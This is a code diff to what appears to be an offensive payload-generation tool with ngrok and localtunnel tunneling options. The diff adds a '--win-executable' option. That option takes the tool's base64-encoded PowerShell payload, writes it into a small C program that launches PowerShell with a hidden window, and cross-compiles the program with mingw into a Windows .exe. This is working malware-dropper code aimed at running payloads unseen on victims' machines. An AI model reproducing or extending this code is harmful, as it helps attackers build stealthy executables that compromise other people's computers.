@@ -92,6 +92,7 @@ parser.add_argument("-lt", "--localtunnel", action="store_true", help="Generate 
 parser.add_argument("-ng", "--ngrok", action="store_true",help="Generate Payload with Ngrok")
 parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
 parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
+parser.add_argument("-e", "--win-executable", action="store", help = "Create a Windows Executable with the payload.")
 
 args = parser.parse_args()
 
@@ -168,9 +169,13 @@ def promptHelpMsg():
 
 
 
-def encodePayload(payload):
+def encodePayload(payload, printPayload=True):
 	enc_payload = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
-	print(f'{PLOAD}{enc_payload}{END}')
+
+	if printPayload:
+		print(f'{PLOAD}{enc_payload}{END}')
+	else:
+		return enc_payload
 
 
 
@@ -667,9 +672,25 @@ def main():
 
 			if args.exec_outfile:
 				payload = payload.replace("*OUTFILE*", args.exec_outfile)
-			
+
 			encodePayload(payload) if not args.raw_payload else print(f'{PLOAD}{payload}{END}')
 
+			# Create a Windows Executable #
+			if args.win_executable:
+				
+				try:
+					check_output(['gcc', '--version'])
+					
+					with open(f'{args.win_executable}.c', 'w') as f:
+						f.write('#include <stdlib.h>\nint main(){ system("start powershell -WindowStyle hidden' + encodePayload(payload, False).replace("powershell", "") + '"); }')
+						
+					if system(f'i686-w64-mingw32-gcc -o {args.win_executable}.exe {args.win_executable}.c && rm -rf {args.win_executable}.c') == 0:
+						print(f'[{INFO}] Windows Executable created: {BOLD}{args.win_executable}.exe{END}')
+					else: print(f'[{FAILED}] Unable to create Windows Executable.')
+
+				except FileNotFoundError:
+					print(f'[{FAILED}] gcc/i686-w64-mingw32-gcc not installed. The Windows Executable will {BOLD}NOT{END} be created.')
+			
 			print(f'[{INFO}] Tunneling [{BOLD}{ORANGE}ON{END}]') if tunneling else chill()
 			
 			if tunneling:
